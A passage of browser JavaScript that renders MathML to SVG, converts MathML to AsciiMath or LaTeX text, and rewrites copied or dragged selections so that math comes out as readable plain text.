  var tagName = node.tagName.toLowerCase();
  var f = MathMLToSVG[tagName];
  if (f == null) {
    console.warn(tagName);
    f = MathMLToSVG["mrow"];
  }
  return f(context, node, scriptlevel);
};

var MI_MN_MO_MTEXT = function (context, node, scriptlevel) {
  var text = node.textContent.replace(/^\s+|\s+$/g, "");
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var font = MathMLToSVG.makeFont(node.tagName.toLowerCase() === "mi" && node.textContent.length === 1 ? "italic" : "normal", node, fontSize);
  context.font = font;
  var textWidth = context.measureText(text).width;
  var lspace = 0;
  var rspace = 0;
  // MathML3 spec has "Operator dictionary entries" with lspace+rspace table
  if (node.tagName.toLowerCase() === "mo") {
    var c = text;
    if (c === '\u2061' || c === '\u2062' || c === '\u2063' ||
        c === '(' || c === ')' || c === '|' || c === '{' || c === '}' ||
        node.nextElementSibling == null || node.previousElementSibling == null ||
        c === ',') {
      lspace = 0;
      rspace = 0;
    } else if (c === "\u00D7" || c === "+") {
      lspace = 4;
      rspace = 4;
    } else {
      lspace = 4;
      rspace = 4;
      console.warn(c);
    }
    //if (c === "\u2212" || c === "~") {
    //  space = 0;
    //}
    if (node.getAttribute("lspace") != null) {
      lspace = Number.parseFloat(node.getAttribute("lspace"));
    }
    if (node.getAttribute("rspace") != null) {
      rspace = Number.parseFloat(node.getAttribute("rspace"));
    }
  }
  lspace = fontSize * lspace / 18;
  rspace = fontSize * rspace / 18;
  return {
    baseline: 0,
    width: lspace + textWidth + rspace,
    height: fontSize,
    render: function () {
      context.translate(lspace, 0);
      context.font = font;
      context.textBaseline = "middle";
      context.textAlign = "center";
      context.fillText(text, textWidth / 2, fontSize / 2);
      context.translate(-lspace, 0);
    }
  };
};

MathMLToSVG.mi = MI_MN_MO_MTEXT;
MathMLToSVG.mn = MI_MN_MO_MTEXT;
MathMLToSVG.mo = MI_MN_MO_MTEXT;
MathMLToSVG.mtext = MI_MN_MO_MTEXT;

MathMLToSVG.mtable = function (context, node, scriptlevel) {
  var sizesByRow = [];
  for (var row = node.firstElementChild; row != null; row = row.nextElementSibling) {
    if (row.tagName.toLowerCase() === "mtr") {
      var rowCellSizes = [];
      for (var cell = row.firstElementChild; cell != null; cell = cell.nextElementSibling) {
        if (cell.tagName.toLowerCase() === "mtd") {
          var sizes = MathMLToSVG.measure(context, cell, scriptlevel);
          rowCellSizes.push(sizes);
        }
      }
      sizesByRow.push(rowCellSizes);
    }
  }
  var rows = sizesByRow.length;
  var cols = 0;
  for (var i = 0; i < rows; i += 1) {
    cols = Math.max(cols, sizesByRow[i].length);
  }

  var columnlines = (node.getAttribute("columnlines") || "none").split(" ");
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var columnspacing = Number.parseFloat(node.getAttribute("columnspacing") || "0.8em") * fontSize;
  var rowBaselines = [];
  for (var i = 0; i < rows; i += 1) {
    rowBaselines.push(0);
  }
  var rowHeights = [];
  for (var i = 0; i < rows; i += 1) {
    rowHeights.push(0);
  }
  var columnWidths = [];
  for (var i = 0; i < cols; i += 1) {
    columnWidths.push(0);
  }
  for (var i = 0; i < rows; i += 1) {
    var row = sizesByRow[i];
    var largestHeightAboveBaseline = 0;
    for (var j = 0; j < row.length; j += 1) {
      var sizes = row[j];
      largestHeightAboveBaseline = Math.max(largestHeightAboveBaseline, sizes.height - sizes.baseline);
    }
    for (var j = 0; j < row.length; j += 1) {
      var sizes = row[j];
      rowHeights[i] = Math.max(rowHeights[i], largestHeightAboveBaseline + sizes.baseline);
      columnWidths[j] = Math.max(columnWidths[j], sizes.width + columnspacing);
    }
    rowBaselines[i] = largestHeightAboveBaseline;
  }

  var height = 0;
  for (var i = 0; i < rowHeights.length; i += 1) {
    height += rowHeights[i];
  }
  var width = 0;
  for (var i = 0; i < columnWidths.length; i += 1) {
    width += columnWidths[i];
    width += columnlines[i % columnlines.length] === "none" ? 0 : 1;
  }

  return {
    baseline: height / 2 - fontSize / 2,
    width: width,
    height: height,
    render: function () {

      var y = 0;
      for (var i = 0; i < sizesByRow.length; i += 1) {
        var row = sizesByRow[i];
        var x = 0;
        for (var j = 0; j < row.length; j += 1) {
          var sizes = row[j];

          var ax = (columnWidths[j] - sizes.width) / 2;
          var ay = rowBaselines[i] - (sizes.height - sizes.baseline); // rowalign="baseline"

          context.translate(x + ax, y + ay);
          sizes.render();
          context.translate(-x - ax, -y - ay);

          x += columnWidths[j];
          var cl = columnlines[j % columnlines.length];
          if (cl !== "none") {
            context.beginPath();
            context.moveTo(x, y);
            context.lineTo(x, y + rowHeights[i]);
            context.stroke();
            x += 1;
          }
        }
        y += rowHeights[i];
      }
    }
  };
};

//TODO: REMOVE
MathMLToSVG.mfenced = function (context, node, scriptlevel) {
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var font = MathMLToSVG.makeFont("normal", node, fontSize);
  var measureFence = function (font, text) {
    context.font = font;
    return context.measureText(text).width;
  };
  var drawFence = function (font, text, textWidth, scaleX, scaleY, fontSize) {
    context.scale(scaleX, scaleY);
    context.font = font;
    context.textBaseline = "middle";
    context.textAlign = "center";
    context.fillText(text, textWidth / 2, fontSize / 2);
    context.scale(1 / scaleX, 1 / scaleY);
  };
  var open = node.getAttribute("open") || "(";
  var close = node.getAttribute("close") || ")";
  var child = node.firstElementChild;
  var sizes = MathMLToSVG.measure(context, child, scriptlevel);
  var openWidth = measureFence(font, open);
  var closeWidth = measureFence(font, close);
  var scaleY = sizes.height / fontSize;
  var scaleX = Math.sqrt(Math.sqrt(scaleY));
  return {
    baseline: sizes.baseline,
    width: openWidth + sizes.width + closeWidth + (scaleX - 1) * openWidth + (scaleX - 1) * closeWidth,
    height: sizes.height,
    render: function () {
      drawFence(font, open, openWidth, scaleX, scaleY, fontSize);
      context.translate(openWidth * scaleX, 0);
      sizes.render();
      context.translate(sizes.width, 0);
      drawFence(font, close, closeWidth, scaleX, scaleY, fontSize);
      context.translate(-sizes.width, 0);
      context.translate(-openWidth * scaleX, 0);
    }
  };
};

function isStretchyOperator(text) {
  return text === '(' || text === ')' || text === '{' || text === '}' || text === '|';
}

function isStretchy(node) {
  return node.tagName.toLowerCase() === 'mo' && isStretchyOperator(node.textContent);
}

var MATH_MROW = function (context, node, scriptlevel) {
  var baseline = 0;
  var width = 0;
  var height = 0;
  var childSizes = [];
  var child = node.firstElementChild;
  while (child != null) {
    var sizes = MathMLToSVG.measure(context, child, scriptlevel);
    baseline = Math.max(baseline, sizes.baseline);
    width += sizes.width;
    height = Math.max(height, sizes.height - sizes.baseline);
    var stretchy = isStretchy(child);
    childSizes.push({
      sizes: sizes,
      stretchy: stretchy
    });
    child = child.nextElementSibling;
  }

  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var scaleY = (height + baseline) / fontSize;
  var scaleX = Math.sqrt(Math.sqrt(scaleY));
  for (var i = 0; i < childSizes.length; i += 1) {
    var sizes = childSizes[i].sizes;
    var stretchy = childSizes[i].stretchy;
    if (stretchy) {
      width += (scaleX - 1) * sizes.width;
    }
  }

  return {
    baseline: baseline,
    width: width,
    height: height + baseline,
    render: function () {
      var x = 0;
      for (var i = 0; i < childSizes.length; i += 1) {
        var sizes = childSizes[i].sizes;
        var stretchy = childSizes[i].stretchy;
        var ay = height - (sizes.height - sizes.baseline);
        context.translate(x, 0);
        if (stretchy) {
          context.scale(scaleX, scaleY);
        } else {
          context.translate(0, ay);
        }
        sizes.render();
        if (stretchy) {
          context.scale(1 / scaleX, 1 / scaleY);
        } else {
          context.translate(0, -ay);
        }
        context.translate(-x, 0);
        if (stretchy) {
          x += (scaleX - 1) * sizes.width;
        }
        x += sizes.width;
      }
    }
  };
};

MathMLToSVG.math = MATH_MROW;
MathMLToSVG.mrow = MATH_MROW;
MathMLToSVG.mtd = MATH_MROW;

//TODO: REMOVE
MathMLToSVG.mstyle = MATH_MROW;

MathMLToSVG.mpadded = function (context, node, scriptlevel) {
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var width = Number.parseFloat(node.getAttribute("width")) * fontSize;
  var lspace = Number.parseFloat(node.getAttribute("lspace")) * fontSize;
  var sizes = MATH_MROW(context, node, scriptlevel);
  return {
    baseline: sizes.baseline,
    width: width + sizes.width,
    height: sizes.height,
    render: function () {
      context.translate(lspace, 0);
      sizes.render();
      context.translate(-lspace, 0);
    }
  };
};

MathMLToSVG.mfrac = function (context, node, scriptlevel) {
  var top = node.firstElementChild;
  var bottom = top.nextElementSibling;
  var topSizes = MathMLToSVG.measure(context, top, scriptlevel + 1);
  var bottomSizes = MathMLToSVG.measure(context, bottom, scriptlevel + 1);
  var width = Math.max(topSizes.width, bottomSizes.width);
  var height = 1 + topSizes.height + bottomSizes.height;
  var fontSize = MathMLToSVG.getFontSize(scriptlevel + 1);
  return {
    baseline: 0.5 + bottomSizes.height - 0.5 * fontSize,
    width: width,
    height: height,
    render: function () {
      context.translate((width - topSizes.width) / 2, 0);
      topSizes.render();
      context.translate(-(width - topSizes.width) / 2, 0);

      var middle = topSizes.height - 0.5;
      context.beginPath();
      context.moveTo(0, middle);
      context.lineTo(width, middle);
      context.stroke();

      context.translate((width - bottomSizes.width) / 2, 1 + topSizes.height);
      bottomSizes.render();
      context.translate(-(width - bottomSizes.width) / 2, -1 - topSizes.height);
    }
  };
};

var MSUP_MSUB = function (context, node, scriptlevel) {
  var base = node.firstElementChild;
  var exponent = base.nextElementSibling;
  var baseSizes = MathMLToSVG.measure(context, base, scriptlevel);
  var exponentSizes = MathMLToSVG.measure(context, exponent, scriptlevel + 1);
  var width = baseSizes.width + exponentSizes.width;
  var fontSize = MathMLToSVG.getFontSize(scriptlevel + 1);
  var height = baseSizes.height + exponentSizes.height - 0.5 * fontSize;
  var isMSUP = node.tagName.toLowerCase() === "msup";
  return {
    baseline: isMSUP ? 0 : 0.5 * fontSize,
    width: width,
    height: height,
    render: function () {
      if (isMSUP) {
        context.translate(0, 0.5 * fontSize);
      }
      baseSizes.render();
      if (isMSUP) {
        context.translate(0, -0.5 * fontSize);
      }
      if (!isMSUP) {
        context.translate(0, baseSizes.height - 0.5 * fontSize);
      }
      context.translate(baseSizes.width, 0);
      exponentSizes.render();
      context.translate(-baseSizes.width, 0);
      if (!isMSUP) {
        context.translate(0, -baseSizes.height + 0.5 * fontSize);
      }
    }
  };
};

MathMLToSVG.msup = MSUP_MSUB;
MathMLToSVG.msub = MSUP_MSUB;

MathMLToSVG.menclose = function (context, node, scriptlevel) {
  var sizes = MATH_MROW(context, node, scriptlevel); // 1*
  var notation = node.getAttribute("notation").split(" ");
  return {
    baseline: sizes.baseline,
    width: sizes.width,
    height: sizes.height,
    render: function () {
      sizes.render();
      var width = sizes.width;
      var height = sizes.height;
      for (var i = 0; i < notation.length; i += 1) {
        var n = notation[i];
        if (n !== "") {
          context.beginPath();
          if (n === "circle") {
            context.ellipse(width / 2, height / 2, width / 2, height / 2, 0, 0, 2 * Math.PI, true);
          } else if (n === "verticalstrike") {
            context.moveTo(width / 2, 0);
            context.lineTo(width / 2, height);
          } else if (n === "horizontalstrike") {
            context.moveTo(0, height / 2);
            context.lineTo(width, height / 2);
          }
          context.stroke();
        }
      }
    }
  };
};

var MSQRT_MROOT = function (context, node, scriptlevel) {
  var isMSQRT = node.tagName.toLowerCase() === "msqrt";
  var surd = "\u221A";
  var fontSize = MathMLToSVG.getFontSize(scriptlevel);
  var font = MathMLToSVG.makeFont("normal", node, fontSize);
  context.font = font;
  var surdWidth = context.measureText(surd).width;
  var h = 1;
  var base = isMSQRT ? node : node.firstElementChild;
  var index = isMSQRT ? undefined : base.nextElementSibling;
  // 1* for msqrt
  var baseSizes = isMSQRT ? MATH_MROW(context, base, scriptlevel) : MathMLToSVG.measure(context, base, scriptlevel);
  var indexSizes = isMSQRT ? undefined : MathMLToSVG.measure(context, index, scriptlevel + 2);
  return {
    baseline: baseSizes.baseline,
    width: baseSizes.width + surdWidth,
    height: baseSizes.height + h + 2,
    render: function () {
      context.translate(0, (baseSizes.height - fontSize) / 2 + 2);
      context.font = font;
      context.textBaseline = "middle";
      context.textAlign = "center";
      context.fillText(surd, surdWidth / 2, fontSize / 2);
      context.translate(0, -(baseSizes.height - fontSize) / 2 - 2);
      context.beginPath();
      context.moveTo(surdWidth, 0);
      context.lineTo(surdWidth + baseSizes.width, 0);
      context.stroke();
      context.translate(surdWidth, h + 2);
      baseSizes.render();
      context.translate(-surdWidth, -h - 2);
      if (!isMSQRT) {
        context.translate(0, -0.25 * fontSize + 2);
        indexSizes.render();
        context.translate(0, 0.25 * fontSize - 2);
      }
    }
  };
};

MathMLToSVG.msqrt = MSQRT_MROOT;
MathMLToSVG.mroot = MSQRT_MROOT;

MathMLToSVG.munder = function (context, node, scriptlevel) {
  var first = node.firstElementChild;
  var second = first.nextElementSibling;
  var firstSizes = MathMLToSVG.measure(context, first, scriptlevel);
  var secondSizes = MathMLToSVG.measure(context, second, scriptlevel);
  var width = Math.max(firstSizes.width, secondSizes.width);
  var height = firstSizes.height + secondSizes.height;
  return {
    baseline: secondSizes.height,
    width: width,
    height: height,
    render: function () {
      context.translate((width - firstSizes.width) / 2, 0);
      firstSizes.render();
      context.translate(-(width - firstSizes.width) / 2, 0);
      context.translate(0, firstSizes.height);
      secondSizes.render();
      context.translate(0, -firstSizes.height);
    }
  };
};

//?
MathMLToSVG.drawMathMLElement = function (element) {
  var svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
  var svgContext = new SVGRenderingContext2D(svg);
  var sizes = MathMLToSVG.measure(svgContext, element, 0);
  var width = sizes.width;
  var height = sizes.height;
  svg.setAttribute("width", width + "px");
  svg.setAttribute("height", height + "px");
  svg.setAttribute("viewBox", "0 0 " + width + " " + height);
  sizes.render();
  var data = (new XMLSerializer()).serializeToString(svg);
  var src = "data:image/svg+xml;charset=utf-8," + encodeURIComponent(data);
  return {
    src: src,
    width: width,
    height: height
  };
};

globalThis.MathMLToSVG = MathMLToSVG;

}());


(function () {
"use strict";

//TODO:
//? "≠": {replacement: "=", precedence: 2}

var isRightToLeftAssociative = {
  ".^": true,
  "^": true
};

var operators = {
  "¯": {replacement: "*", precedence: 8},
  ",": {replacement: ",", precedence: -10},//?
  "\u2192": {replacement: "->", precedence: -9},//? &rarr;
  "\u2194": {replacement: "<->", precedence: -9},//? &harr;
  ".^": {replacement: ".^", precedence: 7},
  "^": {replacement: "^", precedence: 6},
  "\u00D7": {replacement: "*", precedence: 5},// &times;
  "\u22C5": {replacement: "*", precedence: 5},// &sdot;
  "\u2061": {replacement: "", precedence: 6},// &af;
  //TODO: ? cosx
  "\u2062": {replacement: "*", precedence: 5},// &it;
  "\u2063": {replacement: ",", precedence: -10},// &ic;
  "/": {replacement: "/", precedence: 5},
  "\u2215": {replacement: "/", precedence: 5},
  "\u2212": {replacement: "-", precedence: 3}, // &minus;
  "+": {replacement: "+", precedence: 2}
};

var brackets = {
  '(': true,
  '{': true,
  ')': true,
  '}': true,
  '|': true
};

var fence = function (x, operator, left, format) {
  return (x.precedence < operators[operator].precedence || (x.precedence === operators[operator].precedence && (left && isRightToLeftAssociative[operators[operator]] || !left && !isRightToLeftAssociative[operators[operator]]))) ? (format === "LaTeX" ? "\\left(" : "(") + x.string + (format === "LaTeX" ? "\\right)" : ")") : x.string;
};

var transformMTABLE = function (node, format) {
  function isStrikedRow(node) {
    return node.firstElementChild != null &&
           node.firstElementChild.tagName.toLowerCase() === 'mtd' &&
           node.firstElementChild.childElementCount === 1 &&
           node.firstElementChild.firstElementChild.tagName.toLowerCase() === 'menclose' &&
           (node.firstElementChild.firstElementChild.getAttribute('notation') === 'horizontalstrike' || (node.firstElementChild.firstElementChild.getAttribute('notation') || '').indexOf('horizontalstrike') !== -1); // TODO: remove
  }
  function isStrikedColumn(node) {
    return node.childElementCount === 1 &&
           node.firstElementChild.tagName.toLowerCase() === 'menclose' &&
           node.firstElementChild.getAttribute('notation') === 'verticalstrike';
  }
  var childNode = node.firstElementChild;
  var rows = "";
  rows += (format === "LaTeX" ? "\\begin{matrix}\n" : "{");
  var isFirstRow = true;
  while (childNode != undefined) {
    if (childNode.tagName.toLowerCase() === 'mtr' && !isStrikedRow(childNode)) {
      var c = childNode.firstElementChild;
      var row = "";
      while (c != undefined) {
        if (c.tagName.toLowerCase() === 'mtd' && !isStrikedColumn(c)) {
          row += (row !== "" ? (format === "LaTeX" ? " & " : ", ") : "") + fence(transformMathML(c, format), ",", true, format);
        }
        c = c.nextElementSibling;
      }
      rows += (!isFirstRow ? (format === "LaTeX" ? " \\\\\n" : ", ") : "") + (format === "LaTeX" ? "" : "{") + row + (format === "LaTeX" ? "" : "}");
      isFirstRow = false;
    }
    childNode = childNode.nextElementSibling;
  }
  rows += (format === "LaTeX" ? "\n\\end{matrix}" : "}");
  return rows; // "(" + ... + ")" ?
};

function TransformResult(string, precedence) {
  this.string = string;
  this.precedence = precedence;
}

//! This function is also used to convert copy-pasted mathml, so it may support more tags than produced by the site itself.
var transformMathML = function (node, format, inferredMROW) {
  inferredMROW = inferredMROW != undefined ? inferredMROW : false;
  if (format !== "AsciiMath" && format !== "LaTeX") {
    throw new RangeError(format);
  }
  var tagName = inferredMROW ? "mrow" : node.tagName.toLowerCase();
  if (tagName === "math" ||
      tagName === "mtr" ||
      tagName === "mtd" ||
      tagName === "mrow" ||
      tagName === "mfenced" ||
      tagName === "menclose" ||
      tagName === "mpadded" ||
      tagName === "mstyle" ||
      tagName === "mo" ||
      tagName === "mi" ||
      tagName === "mn") {
    var s = "";
    var p = 42;
    if (tagName === "mi" || tagName === "mn" || tagName === "mo") {
      // Google Translate inserts <font> tags
      s = node.textContent;
    } else {
      var childNode = node.firstElementChild;
      while (childNode != undefined) {
        var tmp = transformMathML(childNode, format);
        s += tmp.string;
        if (p > tmp.precedence) {
          p = tmp.precedence;
        }
        childNode = childNode.nextElementSibling;
      }
    }
    if (node.firstElementChild != null && node.firstElementChild.tagName.toLowerCase() === 'mo' && brackets[node.firstElementChild.textContent] != null &&
        node.lastElementChild != null && node.lastElementChild.tagName.toLowerCase() === 'mo' && brackets[node.lastElementChild.textContent] != null) {
      if (format === "LaTeX") {
        s = '\\left' + s.slice(0, -1) + '\\right' + s.slice(-1);
      }
      p = 42;
    }
    if (tagName === "mo") {
      var o = operators[s];
      var precedence = o == undefined ? 0 : o.precedence;
      if (p > precedence) {
        p = precedence;
      }
      s = o == undefined ? s : o.replacement;
    }
    if (tagName === 'mi') {
      if (s === '\u2147') {
        s = 'e';
      } else if (s === '\u2148') {
        s = 'i';
      }
      if (format === "LaTeX") {
        if (s.length === 1 && s.charCodeAt(0) >= 0x03B1 && s.charCodeAt(0) <= 0x03B1 + 24) {
          var greek = " alpha beta gamma delta epsilon zeta eta theta iota kappa lambda mu nu xi omicron pi rho varsigma sigma tau upsilon phi chi psi omega ";
          s = greek.split(' ')[s.charCodeAt(0) - 0x03B1 + 1];
        }
      }
    }
    //TODO: fix
    if (tagName === "mi" && s.length > 1) {
      s = (format === "LaTeX" ? "\\" : "") + s;
    }
    //
    if (tagName === "mn" && s.indexOf(",") !== -1) {
      p = -10 - 1;
    }
    if (tagName === "mo" && s === "," && (node.getAttribute("rspace") != null || node.closest('msub') == null)) {//TODO: ?
      s += " ";
    }
    return tagName === "mfenced" ? new TransformResult((format === "LaTeX" ? "\\left" : "") + (node.getAttribute("open") || "(") + s + (format === "LaTeX" ? "\\right" : "") + (node.getAttribute("close") || ")"), 42) : new TransformResult(s, p);
  }
  if (tagName === "mover") {
    return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + fence(transformMathML(node.firstElementChild.nextElementSibling, format), "^", false, format), operators["^"].precedence);
  }
  if (tagName === "munder") {
    var tmp1 = transformMathML(node.firstElementChild, format);
    var tmp2 = transformMathML(node.firstElementChild.nextElementSibling, format);
    var s = tmp1.string;
    if (tmp2.string !== "") {
      if (s === "=" || s === "~" || s.length === 1) {
        s = s + "[" + tmp2.string + "]" + s;
      } else {
        s = s + "_(" + tmp2.string + ")";
      }
    }
    return new TransformResult(s, 42);
  }
  if (tagName === "munderover") {
    var tmp1 = transformMathML(node.firstElementChild, format);
    var tmp2 = transformMathML(node.firstElementChild.nextElementSibling, format);
    var tmp3 = transformMathML(node.firstElementChild.nextElementSibling.nextElementSibling, format);
    var s = '';
    s += tmp1.string;
    s += "_(" + tmp2.string + ")";
    s += "^(" + tmp3.string + ")";
    return new TransformResult(s, 42);
  }
  if (tagName === "msup") {
    return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + fence(transformMathML(node.firstElementChild.nextElementSibling, format), "^", false, format), operators["^"].precedence);
  }
  if (tagName === "msub") {
    //TODO: fix a_(1,2) ?
    var b = transformMathML(node.firstElementChild, format).string;
    var x = transformMathML(node.firstElementChild.nextElementSibling, format).string;
    return new TransformResult(b + "_" + (format === "LaTeX" ? (x.length > 1 ? '{' + x + '}' : x) : (x.indexOf(",") !== -1 ? "(" + x + ")" : x)), 42); // "(" + ... + ")" ?
  }
  if (tagName === "mfrac") {
    var n = transformMathML(node.firstElementChild, format);
    var d = transformMathML(node.firstElementChild.nextElementSibling, format);
    if (format === "LaTeX") {
      return new TransformResult("\\frac" + "{" + n.string + "}" + "{" + d.string + "}", 42);
    }
    // https://www.unicode.org/notes/tn28/UTN28-PlainTextMath-v3.1.pdf
    return new TransformResult(fence(n, "/", true, format) + (node.getAttribute("linethickness") === "0" ? "¦" : "/") + fence(d, "/", false, format), operators["/"].precedence);
  }
  if (tagName === "msqrt") {
    return new TransformResult((format === "LaTeX" ? "\\" : "") + "sqrt" + (format === "LaTeX" ? "{" : "(") + transformMathML(node, format, true).string + (format === "LaTeX" ? "}" : ")"), 42);
  }
  if (tagName === "mroot") {
    return new TransformResult(fence(transformMathML(node.firstElementChild, format), "^", true, format) + "^" + "(" + "1" + "/" + transformMathML(node.firstElementChild.nextElementSibling, format).string + ")", operators["^"].precedence);
  }
  if (tagName === "mtable") {
    return new TransformResult(transformMTABLE(node, format), 42);
  }
  if (tagName === "mtext") {//?
    //return new TransformResult("", 42);
    var length = 0;
    var child = node.firstChild;
    while (child != null) {
      length += 1;
      child = child.nextSibling;
    }
    var range = {
      startContainer: node,
      startOffset: 0,
      endContainer: node,
      endOffset: length,
      commonAncestorContainer: node
    };
    var ss = globalThis.serializeAsPlainText(range);
    ss = ss.trim();
    if (ss === "(?)" || ss === "?") {//TODO: ?
      ss = "";
    }
    return new TransformResult(ss === "" ? "" : (format === "LaTeX" ? "text(" : "\"") + ss + (format === "LaTeX" ? ")" : "\""), 42);
  }
  if (tagName === "maction") {
    console.info('only first child is handled for <maction>');
    return transformMathML(node.firstElementChild, format);
  }
  if (tagName === "mspace") {
    console.info('ignore <mspace>');
    return new TransformResult("", 42);
  }
  throw new TypeError("transformMathML:" + tagName);
};

globalThis.transformMathML = transformMathML;

}());

/*global window, document, Node, XMLSerializer, transformMathML */

(function () {
"use strict";

var isBlock = function (display) {
  switch (display) {
    case "inline":
    case "inline-block":
    case "inline-flex":
    case "inline-grid":
    case "inline-table":
    case "none":
    case "table-column":
    case "table-column-group":
    case "table-cell":
      return false;
  }
  return true;
};

var getNodeLength = function (container) {
  if (container.nodeType === Node.TEXT_NODE) {
    return container.data.length;
  }
  if (container.nodeType === Node.ELEMENT_NODE) {
    var count = 0;
    var child = container.firstChild;
    while (child != null) {
      child = child.nextSibling;
      count += 1;
    }
    return count;
  }
  return undefined;
};

var isBoundaryPoint = function (container, offset, which, node) {
  if (which === "end" && offset !== getNodeLength(container) || which === "start" && offset !== 0) {
    return false;
  }
  for (var x = container; x !== node; x = x.parentNode) {
    var y = which === "end" ? x.nextSibling : (which === "start" ? x.previousSibling : null);
    // https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Whitespace#Whitespace_helper_functions
    while (y != null && y.nodeType !== Node.ELEMENT_NODE && (y.nodeType !== Node.TEXT_NODE || /^[\t\n\f\r\u0020]*$/.test(y.data))) {
      y = which === "end" ? y.nextSibling : (which === "start" ? y.previousSibling : null);
    }
    if (y != null) {
      return false;
    }
  }
  return true;
};

var getChildNode = function (container, offset, which, node) {
  var child = null;
  var x = container;
  while (x !== node) {
    child = x;
    x = x.parentNode;
  }
  if (child != null) {
    child = which === "end" ? child.nextSibling : (which === "start" ? child : null);
  } else {
    var i = -1;
    child = container.firstChild; // node === container
    while (++i < offset) {
      child = child.nextSibling;
    }
  }
  return child;
};

var serialize = function (range, isLineStart) {
  // big thanks to everyone
  // see https://github.com/timdown/rangy/blob/master/src/modules/rangy-textrange.js
  // see https://github.com/WebKit/webkit/blob/ec2f4d46b97bb20fd0877b1f4b5ec50f7b9ec521/Source/WebCore/editing/TextIterator.cpp#L1188
  // see https://github.com/jackcviers/Rangy/blob/master/spec/innerText.htm

  var node = range.commonAncestorContainer;
  var startContainer = range.startContainer;
  var startOffset = range.startOffset;
  var endContainer = range.endContainer;
  var endOffset = range.endOffset;

  if (node.nodeType === Node.TEXT_NODE) {
    if (node !== startContainer || node !== endContainer) {
      throw new TypeError();
    }
    var data = node.data.slice(startOffset, endOffset);
    var whiteSpace = window.getComputedStyle(node.parentNode, null).whiteSpace;
    if (whiteSpace !== 'pre') {
      data = data.replace(/[\t\n\f\r\u0020]+/g, " ");
      if (isLineStart) {
        data = data.replace(/^[\t\n\f\r\u0020]/g, "");
      }
    }
    return data;
  }
  if (node.nodeType === Node.ELEMENT_NODE) {
    var display = window.getComputedStyle(node, null).display;
    if (display === "none") {
      return "";
    }
    var result = "";
    if (isBlock(display) && !isLineStart) {
      result += "\n";
      isLineStart = true;
    }
    var x = undefined;
    if (isBoundaryPoint(startContainer, startOffset, "start", node) &&
        isBoundaryPoint(endContainer, endOffset, "end", node)) {
      var tagName = node.tagName.toLowerCase();
      if (tagName === "math" || (tagName !== "mtext" && node.namespaceURI === "http://www.w3.org/1998/Math/MathML")) {
        x = transformMathML(node, "AsciiMath").string;
      }
      if (tagName === "br") {
        x = "\n";
      }
    }
    if (x != undefined) {
      result += x;
    } else {
      var startChildNode = getChildNode(startContainer, startOffset, "start", node);
      var endChildNode = getChildNode(endContainer, endOffset, "end", node);
      var childNode = startChildNode;
      while (childNode !== endChildNode) {
        var childNodeRange = {
          startContainer: childNode === startChildNode && startContainer !== node ? startContainer : childNode,
          startOffset: childNode === startChildNode && startContainer !== node ? startOffset : 0,
          endContainer: childNode.nextSibling === endChildNode && endContainer !== node ? endContainer : childNode,
          endOffset: childNode.nextSibling === endChildNode && endContainer !== node ? endOffset : getNodeLength(childNode),
          commonAncestorContainer: childNode
        };
        var y = serialize(childNodeRange, isLineStart);
        isLineStart = y === "" && isLineStart || y.slice(-1) === "\n";
        result += y;
        childNode = childNode.nextSibling;
      }
    }
    if (display === "table-cell") {
      result += "\t";
    }
    if (isBlock(display) && !isLineStart) {
      result = result.replace(/[\t\n\f\r\u0020]$/g, "");
      result += "\n";
      isLineStart = true;
    }
    return result;
  }
  return "";
};

var serializeAsPlainText = function (range) {
  var isLineStart = range.startContainer.nodeType !== Node.TEXT_NODE || /^[\t\n\f\r\u0020]*$/.test(range.startContainer.data.slice(0, range.startOffset));
  var isLineEnd = range.endContainer.nodeType !== Node.TEXT_NODE || /^[\t\n\f\r\u0020]*$/.test(range.endContainer.data.slice(range.endOffset));
  var staticRange = {
    startContainer: range.startContainer,
    startOffset: range.startOffset,
    endContainer: range.endContainer,
    endOffset: range.endOffset,
    commonAncestorContainer: range.commonAncestorContainer
  };
  var value = serialize(staticRange, false);
  if (isLineStart) {
    value = value.replace(/^[\t\n\f\r\u0020]/g, "");
  }
  if (isLineEnd) {
    value = value.replace(/[\t\n\f\r\u0020]$/g, "");
  }
  return value;
};

var serializeAsHTML = function (range) {
  var fragment = range.cloneContents();
  if (range.commonAncestorContainer.nodeType === Node.ELEMENT_NODE && range.commonAncestorContainer.namespaceURI === "http://www.w3.org/1998/Math/MathML") {//?
    var math = document.createElementNS("http://www.w3.org/1998/Math/MathML", "math");
    math.appendChild(fragment);
    fragment = math;
  }
  return new XMLSerializer().serializeToString(fragment); // to have the xmlns for <math> elements
};

var onCopyOrDragStart = function (event) {
  var dataTransfer = event.type === "copy" ? event.clipboardData : event.dataTransfer;
  var tagName = event.target.nodeType === Node.ELEMENT_NODE ? event.target.tagName.toLowerCase() : "";
  if (tagName !== "input" && tagName !== "textarea" && (tagName !== "a" || event.type === "copy") && tagName !== "img") {
    //! dataTransfer.effectAllowed throws an exception in FireFox if tagName is INPUT or TEXTAREA
    if ((event.type === "copy" || dataTransfer.effectAllowed === "uninitialized") && !event.defaultPrevented) {
      var selection = window.getSelection();
      var rangeCount = selection.rangeCount;
      if (rangeCount !== 0 && !selection.isCollapsed) {
        var i = -1;
        var plainText = "";
        var htmlText = "";
        while (++i < rangeCount) {
          //TODO: Firefox makes multiple selection when some <button> elements are selected ...
          var range = selection.getRangeAt(i);
          htmlText += serializeAsHTML(range);
          plainText += serializeAsPlainText(range);
        }
        // see also https://github.com/w3c/clipboard-apis/issues/48
        dataTransfer.setData("text/html", htmlText);
        dataTransfer.setData("text/plain", plainText);
        if (event.type === "copy") {
          event.preventDefault();
        } else {
          dataTransfer.effectAllowed = "copy";
        }
      }
    }
  }
};

if (typeof document !== "undefined") {
  document.addEventListener("copy", onCopyOrDragStart, false);
  document.addEventListener("dragstart", onCopyOrDragStart, false);
}

//!
// rangeInnerText
//globalThis.serializeAsHTML = serializeAsHTML;
globalThis.serializeAsPlainText = serializeAsPlainText;

}());


// based on https://github.com/WICG/spatial-navigation/blob/main/polyfill/spatial-navigation-polyfill.js

/*
  option.mode = 'all'; //!!!TODO: ?
  if (element.tagName.toLowerCase() === 'iframe') {
    return false;
  }
